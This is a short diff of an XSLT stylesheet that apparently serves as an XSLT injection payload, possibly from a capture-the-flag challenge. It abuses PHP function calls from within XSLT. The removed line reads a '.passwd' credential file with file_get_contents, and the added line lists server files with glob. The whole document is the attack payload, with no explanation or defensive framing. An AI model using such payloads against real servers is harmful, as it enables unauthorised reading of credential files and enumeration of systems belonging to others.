@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
- <xsl:value-of select="php:function('file_get_contents','./articleType/.passwd')"/>
+ <xsl:value-of select="php:function('glob','*.*')"/>
 
 
 </xsl:template>
